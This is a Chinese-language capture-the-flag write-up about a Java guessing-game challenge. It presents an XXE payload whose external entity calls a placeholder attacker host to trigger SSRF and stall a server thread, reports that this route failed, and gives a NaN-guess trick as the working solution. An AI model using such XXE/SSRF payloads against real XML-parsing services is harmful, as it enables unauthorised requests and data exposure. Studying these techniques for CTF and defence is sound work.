### XXE
这里是存在XXE漏洞的，但是java版本有点高，`/proc/self/environ`中有`\0`，所以无法通过`http`或者`ftp`协议把java进程环境变量带出来。

于是我尝试这个办法，payload长这样：
```
<?xml version="1.0" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "http://x.x.x.x:8080/result">
]>
<state><guess>&xxe;</guess></state>
```

服务端收到这个xml后，会解析xml，然后向url：`http://x.x.x.x:8080/result`发起http请求（`SSRF`），这个请求会返回`plain txt`，被作为guess的值。

这里让运行在`x.x.x.x:8080/result`的服务器不回复，所以服务端会有1个线程卡在这里：
```
var newState = oldState.update(XML_INPUTS.createXMLEventReader(stream, "UTF-8"));
```

此时，运行在`x.x.x.x:8080/result`的服务器，去爆破获得guess的值，也就是上面的`oldState`的解。获得解之后`x.x.x.x:8080/result`回复解，卡住的线程继续走，获得正确答案，随后`oldState`会判定为第一次猜测，new出一个通过的`newState`。

但是，`replaced = STATES.replace(token, oldState, newState);`，这里使用了全局的map `STATES`，token对应的`State`在`x.x.x.x:8080/result`的爆破过程中已经被替换掉了，之前卡住的线程的无法将`通过`的`newState`写入到map里，因为`oldState`在map中已经不存在了。

所以通过XXE get flag的方法还是没走通。

### 常规解
```
var guess = NaN;
var isLess = guess < this.number - 1e-6 / 2;    // false
var isMore = guess > this.number + 1e-6 / 2;    // false
```